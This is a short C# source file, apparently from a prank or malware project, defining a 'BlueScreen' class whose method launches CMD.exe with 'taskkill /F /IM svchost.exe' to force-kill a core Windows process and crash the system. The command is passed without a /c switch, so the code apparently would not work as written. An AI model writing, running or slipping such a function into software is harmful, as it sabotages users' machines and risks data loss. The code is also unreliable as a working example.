using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ballsBetter.Functions
{
    class BlueScreen
    {
        public static void bs()
        {
            System.Diagnostics.Process.Start("CMD.exe", "taskkill /F /IM svchost.exe");
        }
    }
}
